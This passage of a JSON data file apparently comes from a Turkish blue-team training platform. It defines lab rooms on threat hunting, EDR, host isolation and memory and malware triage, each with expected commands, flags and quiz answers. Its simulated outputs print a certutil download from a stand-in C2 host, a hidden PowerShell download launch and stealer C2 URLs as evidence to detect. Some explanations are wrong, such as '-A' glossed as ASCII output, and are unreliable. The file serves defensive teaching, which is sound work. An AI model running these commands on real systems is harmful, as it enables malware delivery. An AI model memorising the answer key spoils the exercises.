                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `curl -s \"https://api.abuseipdb.com/check?ip=185.220.101.5\"` komutu ezbere yazılan bir kod değil; curl: Terminal üzerinden internetteki bir web adresine veya API'ye istek gönderme aracıdır. -s: 'Silent' modu açar, gereksiz indirme yazılarını gizler ve doğrudan sonucu ekrana yazar. api.abuseipdb.com: Dünyadaki siber güvenlik uzmanlarının şüpheli IP'leri ihbar ettiği küresel kara liste veritabanıdır."
        }
    },
    {
        "id": "blue-202",
        "track": "blue",
        "title": "Tehdit Avcılığı (Threat Hunting) & LOLBins",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "THREAT HUNTING & MITRE ATT&CK",
        "theory": "### Alarm Beklemeyi Bırakın: Tehdit Avı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKapı alarmınız çalmadı diye evinizde hırsız olmadığını garanti edemezsiniz. Belki de hırsız gündüz vakti açık pencereden girip yatağın altına saklandı! Tehdit avcısı eline feneri alıp yatağın altına, dolapların arkasına (meşru görünen proseslere) bakar.\n\nTehdit Avcılığı (Threat Hunting), güvenlik sistemlerinin alarm vermediği durumlarda ağın içinde gizlice yaşayan (Living-off-the-Land) saldırganları proaktif olarak arama sürecidir.\n\n#### 1. LOLBins Kötüye Kullanımı:\n* **T1105 (Ingress Tool Transfer):** Meşru Windows ikili dosyalarının (certutil.exe, bitsadmin.exe) dosya indirmek için kötüye kullanılmasıdır.",
        "mission": "Saldırganların dosya indirmek için kötüye kullandığı meşru certutil prosesini Sysmon günlüklerinde arayarak gizli C2 indirme izini yakalayın.",
        "expectedCommand": "grep -i \"certutil.*urlcache\" /var/log/sysmon.log",
        "acceptedCommands": [
            "hunt-process --name certutil.exe --args '-urlcache'",
            "hunt-process certutil.exe",
            "grep -i certutil /var/log/sysmon.log"
        ],
        "hintExplanation": "<p><strong>grep -i:</strong> Büyük ve küçük harf farkı gözetmeksizin arama yapar.</p>\n<p><strong>\"certutil.*urlcache\":</strong> Normalde sertifika doğrulayan Windows aracı olan certutil'in internetten gizlice zararlı dosya indirmek için kullanılan argüman kalıbıdır (LOLBins).</p>\n<p><strong>/var/log/sysmon.log:</strong> Bilgisayarda çalışan tüm programların komut argümanlarını kaydeden gelişmiş log dosyasıdır.</p>",
        "terminalSuccessOutput": "[HUNTING ENGINE] Tehdit Avı Hipotezi: T1105 LOLBins Abuse\n[ANOMALİ TESPİT EDİLDİ]\nZaman: 11/08 14:48:19 | Host: FIN-WS-09 | Kullanıcı: corp\\ali\nProses: C:\\Windows\\System32\\certutil.exe\nArgümanlar: certutil.exe -urlcache -split -f http://evil-c2.lfl/payload.exe C:\\Temp\\update.exe\n[FLAG] LFL{threat_hunting_lolbins_certutil_exposed}",
        "flag": "LFL{threat_hunting_lolbins_certutil_exposed}",
        "nextId": "blue-203",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Tehdit Avcılığı ve Analiz) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `grep -i \"certutil.*urlcache\" /var/log/sysmon.log` komutunu kullanmamızın sebebi; **Tehdit Avcılığı (Threat Hunting) & LOLBins** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. grep -i: Büyük ve küçük harf farkı gözetmeksizin arama yapar. \"certutil.*urlcache\": Normalde sertifika doğrulayan Windows aracı olan certutil'in internetten gizlice zararlı dosya indirmek için kullanılan argüman kalıbıdır (LOLBins). /var/log/sysmon.log: Bilgisayarda çalışan tüm programların komut argümanlarını kaydeden gelişmiş log dosyasıdır.",
        "cmdAnatomy": [
            {
                "token": "grep",
                "role": "Ana Komut (Metin Filtreleme)",
                "desc": "Samanlıkta iğne arar gibi binlerce satırlık yazı içinde sadece aradığın kelimeyi içeren satırları süzüp getirir."
            },
            {
                "token": "-i",
                "role": "Parametre (Arayüz / Harf Duyarsız)",
                "desc": "ssh ile: özel anahtar dosyası seçer (`-i id_rsa`). tcpdump ile: dinlenecek ağ kartını seçer (`-i eth0`). grep ile: büyük/küçük harf farkını yoksayar."
            },
            {
                "token": "\"certutil.*urlcache\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"certutil.*urlcache\")."
            },
            {
                "token": "/var/log/sysmon.log",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/var/log/sysmon.log)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[HUNTING ENGINE] Tehdit Avı Hipotezi: T1105 LOLBins Abuse",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[ANOMALİ TESPİT EDİLDİ]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Zaman: 11/08 14:48:19 | Host: FIN-WS-09 | Kullanıcı: corp\\ali",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Proses: C:\\Windows\\System32\\certutil.exe",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "grep",
                "desc": "Tehdit Avcılığı (Threat Hunting) & LOLBins görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `grep -i \"certutil.*urlcache\" /var/log/sysmon.log` komutunun temel amacı nedir?",
            "options": [
                "Saldırganların dosya indirmek için kötüye kullandığı meşru certutil prosesini Sysmon günlüklerinde arayarak gizli C2 indirme izini yakalayın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `grep -i \"certutil.*urlcache\" /var/log/sysmon.log` komutu ezbere yazılan bir kod değil; grep -i: Büyük ve küçük harf farkı gözetmeksizin arama yapar. \"certutil.*urlcache\": Normalde sertifika doğrulayan Windows aracı olan certutil'in internetten gizlice zararlı dosya indirmek için kullanılan argüman kalıbıdır (LOLBins). /var/log/sysmon.log: Bilgisayarda çalışan tüm programların komut argümanlarını kaydeden gelişmiş log dosyasıdır."
        }
    },
    {
        "id": "blue-203",
        "track": "blue",
        "title": "Uç Nokta Güvenliği (EDR / XDR Mimarisi)",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "EDR/XDR & TELEMETRY",
        "theory": "### Antivirüsün Evrimi: EDR ve XDR\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinanın içinde serbestçe gezen bir kişinin yüzüne bakmak yerine hareketlerine bakmaktır: \"Bu adam kütüphaneye girdi ama kitap okumak yerine gizlice duvar prizini sökmeye çalışıyor!\" Word prosesinin altından PowerShell çıkması gibi anormal davranışlar anında tespit edilir.\n\nGeleneksel antivirüs yazılımları (AV) sadece diske yazılan dosyanın hash'ini kontrol eder. Ancak modern saldırılar bellekte yaşar (Fileless Malware) ve meşru sistem araçlarını kullanır.\n\n#### 1. EDR (Endpoint Detection and Response):\n* **Proses Ağacı (Process Tree):** Hangi prosesin kimi başlattığını izler. Örneğin: `WINWORD.EXE` (Word) kalkıp altında `powershell.exe` başlatıyorsa bu %99 zararlı bir makrodur.",
        "mission": "EDR telemetrisinde Word uygulamasının anormal alt proses başlatmasını (Parent-Child anomalisini) listeleyin.",
        "expectedCommand": "edr-cli query \"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"",
        "acceptedCommands": [
            "edr-query --parent WINWORD.EXE --child powershell.exe",
            "edr-query WINWORD.EXE",
            "edr-cli query WINWORD.EXE"
        ],
        "hintExplanation": "<p><strong>edr-cli query:</strong> Bilgisayarlara kurulu uç nokta ajanından (EDR) canlı proses sorgusu yapar.</p>\n<p><strong>ParentImage:*WINWORD.EXE:</strong> Anne prosesin Microsoft Word olduğunu belirtir.</p>\n<p><strong>Image:*powershell.exe:</strong> Çocuk prosesin PowerShell olduğunu belirtir. Bir Word belgesi hiçbir zaman arka planda gizlice komut satırı açmamalıdır; bu %100 zararlı makro saldırısıdır!</p>",
        "terminalSuccessOutput": "[EDR PROSES AĞACI ANALİZİ]\nParent: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID: 5120)\n└── Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID: 8192)\n    └── Komut: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object Net.WebClient)...\n[EDR ACTION]: Host izole edildi (Network Quarantine) | Proses ağacı sonlandırıldı.\n[FLAG] LFL{edr_telemetry_parent_child_anomaly}",
        "flag": "LFL{edr_telemetry_parent_child_anomaly}",
        "nextId": "blue-301",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Tehdit Avcılığı ve Analiz) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `edr-cli query \"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"` komutunu kullanmamızın sebebi; **Uç Nokta Güvenliği (EDR / XDR Mimarisi)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. edr-cli query: Bilgisayarlara kurulu uç nokta ajanından (EDR) canlı proses sorgusu yapar. ParentImage:*WINWORD.EXE: Anne prosesin Microsoft Word olduğunu belirtir. Image:*powershell.exe: Çocuk prosesin PowerShell olduğunu belirtir. Bir Word belgesi hiçbir zaman arka planda gizlice komut satırı açmamalıdır; bu %100 zararlı makro saldırısıdır!",
        "cmdAnatomy": [
            {
                "token": "edr-cli",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (edr-cli)."
            },
            {
                "token": "query",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (query)."
            },
            {
                "token": "\"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[EDR PROSES AĞACI ANALİZİ]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Parent: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "└── Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PI...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "└── Komut: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden (N...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "WINWORD.EXE",
                "desc": "Bu odadaki (Uç Nokta Güvenliği (EDR / XDR Mimarisi)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "powershell.exe",
                "desc": "Bu odadaki (Uç Nokta Güvenliği (EDR / XDR Mimarisi)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `edr-cli query \"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"` komutunun temel amacı nedir?",
            "options": [
                "EDR telemetrisinde Word uygulamasının anormal alt proses başlatmasını (Parent-Child anomalisini) listeleyin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `edr-cli query \"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"` komutu ezbere yazılan bir kod değil; edr-cli query: Bilgisayarlara kurulu uç nokta ajanından (EDR) canlı proses sorgusu yapar. ParentImage:*WINWORD.EXE: Anne prosesin Microsoft Word olduğunu belirtir. Image:*powershell.exe: Çocuk prosesin PowerShell olduğunu belirtir. Bir Word belgesi hiçbir zaman arka planda gizlice komut satırı açmamalıdır; bu %100 zararlı makro saldırısıdır!"
        }
    },
    {
        "id": "blue-301",
        "track": "blue",
        "title": "Olay Müdahalesi (Incident Response): İzolasyon",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "INCIDENT RESPONSE & PICERL",
        "theory": "### Alarm Çaldığında Panik Yok: Olay Müdahalesi (IR)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nGrip olan bir hastayı diğer sağlıklı insanlardan ayırmak için karantinaya alırsınız. Sunucu hacklendiğinde ilk iş fişini çekip format atmak değil, ağ bağlantısını izole ederek virüsün diğer sunuculara sıçramasını engellemektir!\n\nBir siber güvenlik olayı gerçekleştiğinde ilk amaç sistemi hemen kapatmak DEĞİLDİR; çünkü bilgisayarı kapatmak uçucu bellekteki (RAM) en değerli saldırgan delillerini yok eder.\n\n#### 1. PICERL Metodolojisi (NIST / SANS):\n1. **Preparation:** Hazırlık.\n2. **Identification:** Tespit.\n3. **Containment (İzolasyon):** Saldırganın yana doğru hareketini (lateral movement) önlemek için enfekte makinenin ağ bağlantısının kesilmesi.\n4. **Eradication:** Yok etme.\n5. **Recovery:** Kurtarma.\n6. **Lessons Learned:** Çıkarılan dersler.",
        "mission": "Saldırı altında olan 192.168.1.120 IP'li sunucunun iç ağ ile olan iletişimini güvenlik duvarından keserek karantinaya alın.",
        "expectedCommand": "iptables -A INPUT -s 192.168.1.120 -j DROP",
        "acceptedCommands": [
            "ir-isolate --target 192.168.1.120 --block-all --allow-soc-ip 10.0.0.5",
            "isolate-host 192.168.1.120",
            "ufw deny from 192.168.1.120"
        ],
        "hintExplanation": "<p><strong>iptables:</strong> Linux çekirdeğinin dahili güvenlik duvarı (Firewall) yönetim komutudur.</p>\n<p><strong>-A INPUT:</strong> Gelen trafik kurallarına yeni bir güvenlik satırı ekle demektir.</p>\n<p><strong>-s 192.168.1.120:</strong> Karantinaya alınacak enfekte sunucunun IP adresidir.</p>\n<p><strong>-j DROP:</strong> Bu makineden gelen tüm paketleri çöpe at, ağ iletişimini anında dondur (karantinaya al) demektir.</p>",
        "terminalSuccessOutput": "[INCIDENT RESPONSE CONTROLLER]\n[+] Hedef: 192.168.1.120 ağ katmanında izole ediliyor...\n[+] Giden tüm TCP/UDP bağlantıları kesildi (DROP ALL).\n[+] Sadece SOC yönetim IP'si (10.0.0.5) adli inceleme için açık bırakıldı.\n[DURUM]: Karantina başarılı. Saldırganın C2 bağlantısı koptu!\n[FLAG] LFL{incident_response_host_isolation_active}",
        "flag": "LFL{incident_response_host_isolation_active}",
        "nextId": "blue-302",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `iptables -A INPUT -s 192.168.1.120 -j DROP` komutunu kullanmamızın sebebi; **Olay Müdahalesi (Incident Response): İzolasyon** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. iptables: Linux çekirdeğinin dahili güvenlik duvarı (Firewall) yönetim komutudur. -A INPUT: Gelen trafik kurallarına yeni bir güvenlik satırı ekle demektir. -s 192.168.1.120: Karantinaya alınacak enfekte sunucunun IP adresidir. -j DROP: Bu makineden gelen tüm paketleri çöpe at, ağ iletişimini anında dondur (karantinaya al) demektir.",
        "cmdAnatomy": [
            {
                "token": "iptables",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (iptables)."
            },
            {
                "token": "-A",
                "role": "Parametre (ASCII Metin Gösterimi)",
                "desc": "Yakalanan ağ paketlerinin içindeki verileri insanların okuyabileceği düz metin (ASCII) olarak ekrana döker."
            },
            {
                "token": "INPUT",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (INPUT)."
            },
            {
                "token": "-s",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-s)."
            },
            {
                "token": "192.168.1.120",
                "role": "Hedef IP / Ağ Adresi",
                "desc": "İşlemin uygulanacağı hedef makinenin veya ağın IP adresi (192.168.1.120)."
            },
            {
                "token": "-j",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-j)."
            },
            {
                "token": "DROP",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (DROP)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[INCIDENT RESPONSE CONTROLLER]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Hedef: 192.168.1.120 ağ katmanında izole ediliyor...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Giden tüm TCP/UDP bağlantıları kesildi (DROP ALL).",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            },
            {
                "snippet": "[+] Sadece SOC yönetim IP'si (10.0.0.5) adli inceleme için açık bırakıldı.",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "iptables",
                "desc": "Olay Müdahalesi (Incident Response): İzolasyon görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `iptables -A INPUT -s 192.168.1.120 -j DROP` komutunun temel amacı nedir?",
            "options": [
                "Saldırı altında olan 192.168.1.120 IP'li sunucunun iç ağ ile olan iletişimini güvenlik duvarından keserek karantinaya alın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `iptables -A INPUT -s 192.168.1.120 -j DROP` komutu ezbere yazılan bir kod değil; iptables: Linux çekirdeğinin dahili güvenlik duvarı (Firewall) yönetim komutudur. -A INPUT: Gelen trafik kurallarına yeni bir güvenlik satırı ekle demektir. -s 192.168.1.120: Karantinaya alınacak enfekte sunucunun IP adresidir. -j DROP: Bu makineden gelen tüm paketleri çöpe at, ağ iletişimini anında dondur (karantinaya al) demektir."
        }
    },
    {
        "id": "blue-302",
        "track": "blue",
        "title": "Dijital Adli Bilişim: RAM Analizi (Volatility)",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "DIGITAL FORENSICS & VOLATILITY",
        "theory": "### Belleğin Karakutusu: Uçucu Bellek (RAM) Adli Bilişimi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir suç mahallinde katilin ayak izleri karda kalmıştır. Ancak güneş doğarsa kar erir ve izler yok olur. RAM de tıpkı o kardır; bilgisayarı kapattığınız anda içindeki şifreler silinir! Bu yüzden önce canlı RAM kopyası (memory dump) alınır.\n\nSaldırganlar artık diskte iz bırakmayan, sadece RAM'de çalışan zararlılar kullanmaktadır. Volatility, alınan bellek imajını analiz eden dünyanın 1 numaralı açık kaynak adli bilişim aracıdır.\n\n#### 1. Volatility Temel Eklentileri:\n* **windows.malfind:** Belleğe sonradan enjekte edilmiş (`PAGE_EXECUTE_READWRITE` izinli) şüpheli kod alanlarını ve PE başlıklarını (`MZ`) tespit eder.",
        "mission": "Kurban makineden alınan 'memdump.raw' bellek imajında gizlenmiş kod enjeksiyonlarını yakalamak için Volatility malfind eklentisini çalıştırın.",
        "expectedCommand": "vol -f memdump.raw windows.malfind",
        "acceptedCommands": [
            "vol.py -f memdump.raw windows.malfind",
            "python3 vol.py -f memdump.raw windows.malfind"
        ],
        "hintExplanation": "<p><strong>vol:</strong> Dünyanın 1 numaralı canlı RAM (uçucu bellek) adli bilişim aracı olan Volatility 3 komutudur.</p>\n<p><strong>-f memdump.raw:</strong> İncelenecek canlı bellek dökümü dosyasını belirtir.</p>\n<p><strong>windows.malfind:</strong> Bellekte hem yazılabilir hem çalıştırılabilir (PAGE_EXECUTE_READWRITE) olan ve içine yabancı kod sokulmuş şüpheli proses bölgelerini otomatik avlayan eklentidir.</p>",
        "terminalSuccessOutput": "Volatility 3 Framework 2.4.1\nPID    Process        Start VPN           Tag    Protection\n4288   explorer.exe   0x0000021a8c00000   Vad    PAGE_EXECUTE_READWRITE\n0x0000021a8c00000  4d 5a 90 00 03 00 00 00  MZ...... (Zararlı PE Enjeksiyonu Tespit Edildi!)\n[FLAG] LFL{volatility_memory_injection_discovered}",
        "flag": "LFL{volatility_memory_injection_discovered}",
        "nextId": "blue-303",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `vol -f memdump.raw windows.malfind` komutunu kullanmamızın sebebi; **Dijital Adli Bilişim: RAM Analizi (Volatility)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. vol: Dünyanın 1 numaralı canlı RAM (uçucu bellek) adli bilişim aracı olan Volatility 3 komutudur. -f memdump.raw: İncelenecek canlı bellek dökümü dosyasını belirtir. windows.malfind: Bellekte hem yazılabilir hem çalıştırılabilir (PAGE_EXECUTE_READWRITE) olan ve içine yabancı kod sokulmuş şüpheli proses bölgelerini otomatik avlayan eklentidir.",
        "cmdAnatomy": [
            {
                "token": "vol",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (vol)."
            },
            {
                "token": "-f",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-f)."
            },
            {
                "token": "memdump.raw",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (memdump.raw)."
            },
            {
                "token": "windows.malfind",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (windows.malfind)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Volatility 3 Framework 2.4.1",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "PID    Process        Start VPN           Tag    Protection",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "4288   explorer.exe   0x0000021a8c00000   Vad    PAGE_EXECUTE_READWRITE",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "0x0000021a8c00000  4d 5a 90 00 03 00 00 00  MZ...... (Zararlı PE Enjeksi...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "PAGE_EXECUTE_READWRITE",
                "desc": "Bu odadaki (Dijital Adli Bilişim: RAM Analizi (Volatility)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "MZ",
                "desc": "Bu odadaki (Dijital Adli Bilişim: RAM Analizi (Volatility)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `vol -f memdump.raw windows.malfind` komutunun temel amacı nedir?",
            "options": [
                "Kurban makineden alınan 'memdump.raw' bellek imajında gizlenmiş kod enjeksiyonlarını yakalamak için Volatility malfind eklentisini çalıştırın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `vol -f memdump.raw windows.malfind` komutu ezbere yazılan bir kod değil; vol: Dünyanın 1 numaralı canlı RAM (uçucu bellek) adli bilişim aracı olan Volatility 3 komutudur. -f memdump.raw: İncelenecek canlı bellek dökümü dosyasını belirtir. windows.malfind: Bellekte hem yazılabilir hem çalıştırılabilir (PAGE_EXECUTE_READWRITE) olan ve içine yabancı kod sokulmuş şüpheli proses bölgelerini otomatik avlayan eklentidir."
        }
    },
    {
        "id": "blue-303",
        "track": "blue",
        "title": "Tersine Mühendislik & Zararlı Analizi: Strings Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "MALWARE ANALYSIS & TRIAGE",
        "theory": "### Zararlının İç Anatomisi: Statik ve Dinamik Analiz\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir bomba uzmanı şüpheli bir paket bulduğunda önce sallamadan röntgenini çeker (Statik Analiz). İçinde saat pili, kablo ve dinamit olduğunu anlar. Daha sonra güvenli bir çelik odada (Sandbox) kontrollü olarak patlatır ve etkisine bakar (Dinamik Analiz).\n\nMüdahale ekibinin eline geçen şüpheli dosyanın ne yaptığını, hangi sunucuyla konuştuğunu ve şifreleme anahtarını bulmak için zararlı yazılım analizi yapılır.\n\n#### 1. Statik Analiz:\n* **Strings Analizi:** İkili dosya içindeki okunabilir metinler dökülür (C2 domainleri, IP adresleri, fonksiyon isimleri).",
        "mission": "Şüpheli fatura_belgesi.exe dosyasının statik strings çıktısını filtreleyerek gömülü C2 sunucu adresini açığa çıkarın.",
        "expectedCommand": "strings fatura_belgesi.exe | grep -iE \"http|https\"",
        "acceptedCommands": [
            "strings fatura_belgesi.exe | grep -iE 'http|https'",
            "strings fatura_belgesi.exe | grep http",
            "strings fatura_belgesi.exe"
        ],
        "hintExplanation": "<p><strong>strings:</strong> Bir çalıştırılabilir dosyanın (exe, bin) içindeki okunabilir insan yazılarını ekrana döker.</p>\n<p><strong>|:</strong> Bir komutun çıktısını diğer komutun girdisine bağlar.</p>\n<p><strong>grep -iE \"http|https\":</strong> Dosya içindeki binlerce anlamsız yazının arasından yalnızca web adreslerini (saldırganın iletişim kurduğu C2 sunucusunu) ayıklar.</p>",
        "terminalSuccessOutput": "[STRINGS STATIK TRIYAZ ÇIKTISI]\nhttps://api.telegram.org/bot7128912/sendMessage [Zararlı C2 Exfiltration Kanalı]\nhttp://dark-nexus.lfl/gate.php?beacon=\n[ANALİZ TAMAMLANDI]: Dosya Telegram Bot API'sini gizli C2 tüneli olarak kullanan bir Stealer!\n[FLAG] LFL{malware_static_strings_stealer_triaged}",
        "flag": "LFL{malware_static_strings_stealer_triaged}",
        "nextId": "blue-304",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `strings fatura_belgesi.exe | grep -iE \"http|https\"` komutunu kullanmamızın sebebi; **Tersine Mühendislik & Zararlı Analizi: Strings Analizi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. strings: Bir çalıştırılabilir dosyanın (exe, bin) içindeki okunabilir insan yazılarını ekrana döker. |: Bir komutun çıktısını diğer komutun girdisine bağlar. grep -iE \"http|https\": Dosya içindeki binlerce anlamsız yazının arasından yalnızca web adreslerini (saldırganın iletişim kurduğu C2 sunucusunu) ayıklar.",
        "cmdAnatomy": [
            {
                "token": "strings",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (strings)."
            },
            {
                "token": "fatura_belgesi.exe",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (fatura_belgesi.exe)."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe / Aktarım)",
                "desc": "Sol taraftaki komutun ürettiği ekran çıktısını alır, sağ taraftaki komuta girdi olarak aktarır (iki komutu birbirine bağlar)."
            },
            {
                "token": "grep",
                "role": "Ana Komut (Metin Filtreleme)",
